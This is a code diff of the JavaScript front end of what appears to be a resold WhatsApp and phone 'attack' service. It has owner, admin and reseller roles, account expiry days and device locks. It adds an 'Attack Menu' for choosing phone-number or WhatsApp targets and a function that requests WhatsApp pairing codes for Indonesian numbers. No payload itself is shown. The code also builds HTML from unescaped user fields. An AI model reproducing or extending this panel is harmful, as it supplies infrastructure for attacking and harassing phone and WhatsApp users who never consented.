-      showNotification('Master token regenerated', 'success');
-    } else {
-      showNotification(result.message || 'Failed to regenerate token', 'error');
-    }
-  } catch (error) {
-    console.error('Error regenerating token:', error);
-    showNotification('Failed to regenerate token', 'error');
+    alert('Failed to reset device ID');
   }
 }
 
 /* ========== USER LIST MANAGEMENT ========== */
 async function loadUserList() {
   const userListBody = document.getElementById('userListBody');
-  userListBody.innerHTML = '<tr><td colspan="5" class="loading-text"><i class="fas fa-circle-notch fa-spin"></i> Loading user data...</td></tr>';
+  userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">Loading users...</td></tr>';
 
   try {
     const users = await getUsers();
@@ -1230,7 +662,7 @@ async function loadUserList() {
       const row = document.createElement('tr');
       
       let actions = '';
-      if (currentUser.role === 'owner' || (currentUser.role === 'admin' && user.role !== 'owner')) {
+      if (currentUser.role === 'admin' && user.username !== currentUser.username) {
         actions = `
           <div class="action-menu">
             <button class="action-btn">
@@ -1240,11 +672,9 @@ async function loadUserList() {
               <a href="#" onclick="addDaysToUser('${user.username}'); return false;">
                 <i class="fas fa-calendar-plus"></i> Add Days
               </a>
-              ${currentUser.role === 'owner' ? `
               <a href="#" onclick="changeUserRole('${user.username}'); return false;">
                 <i class="fas fa-user-tag"></i> Change Role
               </a>
-              ` : ''}
               <a href="#" onclick="changeUsername('${user.username}'); return false;">
                 <i class="fas fa-user-edit"></i> Change Username
               </a>
@@ -1252,10 +682,10 @@ async function loadUserList() {
                 <i class="fas fa-key"></i> Change Password
               </a>
               <a href="#" onclick="resetDeviceId('${user.username}'); return false;">
-                <i class="fas fa-mobile-alt"></i> Reset Device
+                <i class="fas fa-mobile-alt"></i> Reset Device ID
               </a>
               <a href="#" onclick="deleteUser('${user.username}'); return false;" style="color: #f44336;">
-                <i class="fas fa-trash"></i> Delete
+                <i class="fas fa-trash"></i> Delete User
               </a>
             </div>
           </div>
@@ -1264,11 +694,9 @@ async function loadUserList() {
       
       row.innerHTML = `
         <td>${user.username}</td>
-        <td>
-          <span class="role-badge ${user.role}">${user.role}</span>
-        </td>
+        <td>${user.role}</td>
         <td>${user.expired || 'N/A'}</td>
-        <td>${user.device_id ? user.device_id.substring(0, 6) + '...' : 'Not logged in'}</td>
+        <td>${user.device_id || 'Not logged in'}</td>
         <td>${actions}</td>
       `;
       userListBody.appendChild(row);
@@ -1278,46 +706,95 @@ async function loadUserList() {
   }
 }
 
-/* ========== DASHBOARD FUNCTIONS ========== */
-function showDashboard() {
-  if (!currentUser) return;
+/* ========== ATTACK MENU FUNCTIONS ========== */
+function switchAttackTab(tabName) {
+  document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.classList.toggle('active', btn.textContent.toLowerCase().includes(tabName));
+  });
   
+  document.getElementById('numberTarget').classList.toggle('hidden', tabName !== 'number');
+  document.getElementById('whatsappTarget').classList.toggle('hidden', tabName !== 'whatsapp');
+  document.getElementById('attackResult').innerHTML = '';
+}
+
+function switchAttackType(type) {
+  const phoneSection = document.getElementById('phoneAttackSection');
+  const whatsappSection = document.getElementById('whatsappAttackSection');
+  
+  if (type === 'phone') {
+    phoneSection.classList.remove('hidden');
+    whatsappSection.classList.add('hidden');
+  } else {
+    phoneSection.classList.add('hidden');
+    whatsappSection.classList.remove('hidden');
+  }
+  
+  document.getElementById('attackResult').innerHTML = '';
+  checkApiConnection();
+}
+
+/* ========== DASHBOARD FUNCTIONS ========== */
+/* Pairing Code Generation */
+async function generatePairing() {
+  if (!currentUser) {
+    showNotification('Please login first', 'error');
+    return;
+  }
+
+  const number = prompt(`Enter WhatsApp number for pairing (62xxx):`);
+  if (!number || !number.startsWith('62')) {
+    showNotification('Please enter a valid Indonesian number (62xxx)', 'error');
+    return;
+  }
+
+  const pairingResult = document.getElementById('pairingResult');
+  
+  try {
+    pairingResult.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating pairing code...';
+    
+    const response = await fetch(`/pairing-code?number=${encodeURIComponent(number)}&user=${currentUser.username}`);
+    
+    if (!response.ok) {
+      throw new Error(await response.text());
+    }
+
+    const data = await response.json();
+    
+    if (data.success) {
+      pairingResult.innerHTML = `
+        <div><strong>Code:</strong> ${data.code}</div>
+        <div><small>Expires in: 10 minutes</small></div>
+      `;
+      showNotification('Pairing code generated!', 'success');
+    } else {
+      pairingResult.textContent = `Error: ${data.message || 'Failed to generate code'}`;
+      showNotification(data.message || 'Pairing failed', 'error');
+    }
+  } catch (error) {
+    pairingResult.textContent = 'Connection error';
+    showNotification('Failed to connect to server', 'error');
+    console.error('Pairing error:', error);
+  }
+}
+
+/* Update showDashboard to maintain pairing status */
+function showDashboard() {
   header.classList.remove('hidden');
-  userBadge.classList.remove('hidden');
   loginCard.classList.add('hidden');
   dashboard.classList.remove('hidden');
   
-  // Update user info
   document.getElementById('infoUsername').textContent = currentUser.username;
   document.getElementById('infoRole').textContent = currentUser.role;
-  document.getElementById('infoDeviceId').textContent = localDeviceId.substring(0, 8) + '...';
-  document.getElementById('infoExpired').textContent = currentUser.expired || 'Never';
+  document.getElementById('infoDeviceId').textContent = localDeviceId;
+  document.getElementById('infoExpired').textContent = currentUser.expired || 'N/A';
   
-  // Update my info form
   document.getElementById('myInfoUsername').value = currentUser.username;
   document.getElementById('myInfoRole').value = currentUser.role;
   
-  // Update role badge
-  currentRole.textContent = currentUser.role;
-  currentRole.className = `role-badge ${currentUser.role}`;
+  // Reset pairing status when showing dashboard
+  document.getElementById('pairingResult').textContent = 'Status: Not paired';
   
-  // Update welcome message
-  const welcomeMessages = {
-    owner: `Welcome back, Owner!`,
-    admin: `Admin Dashboard`,
-    reseller: `Reseller Panel`,
-    user: `User Dashboard`
-  };
-  
-  document.getElementById('welcomeMessage').textContent = welcomeMessages[currentUser.role] || 'Welcome back!';
-  
-  // Check API status
-  checkApiConnection();
-  
-  // Update side menu
   updateSideMenu();
-  
-  // Start session timer
   startInactivityTimer();
 }
 
@@ -1331,16 +808,14 @@ function updateSideMenu() {
     { icon: 'fa-bug', text: 'Attack Menu', action: () => showMenu('attackMenu') }
   ];
 
-  if (currentUser.role === 'admin' || currentUser.role === 'reseller') {
+  if (currentUser.role === 'admin') {
     menuItems.push(
       { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') },
       { icon: 'fa-users', text: 'List Users', action: () => showMenu('adminListUsers') }
     );
-  }
-
-  if (currentUser.role === 'owner') {
+  } else if (currentUser.role === 'reseller') {
     menuItems.push(
-      { icon: 'fa-crown', text: 'Owner Panel', action: () => showMenu('ownerPanel') }
+      { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') }
     );
   }
 
@@ -1364,15 +839,4 @@ function updateSideMenu() {
   logoutItem.style.marginTop = '20px';
   logoutItem.style.color = '#f44336';
   sideMenu.appendChild(logoutItem);
-}
-
-/* Helper functions for UI feedback */
-function showError(element, message) {
-  element.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
-  element.style.color = '#f44336';
-}
-
-function showSuccess(element, message) {
-  element.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
-  element.style.color = 'var(--main)';
 }
